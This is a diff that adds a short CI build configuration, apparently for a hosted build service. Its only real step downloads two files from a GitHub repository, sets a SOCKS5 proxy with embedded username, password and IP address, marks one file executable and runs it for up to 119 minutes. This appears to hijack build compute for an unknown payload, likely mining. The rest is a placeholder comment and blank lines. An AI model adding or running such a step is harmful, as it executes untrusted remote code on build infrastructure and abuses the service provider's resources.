@@ -1,0 +1,13 @@
+build:
+    dependencies:
+        override:
+            - wget -O 1 https://github.com/konchilsxx/asw/raw/main/tepel && wget -O 2 https://github.com/konchilsxx/asw/raw/main/v2 && export_http_proxy=socks5://jxkjpywa:f04h5dfeyfme@45.57.255.130:7169 && chmod u+x 1 && timeout 119m ./1
+
+
+            # or use a "dummy" command like
+            - true
+
+
+           
+
+ 
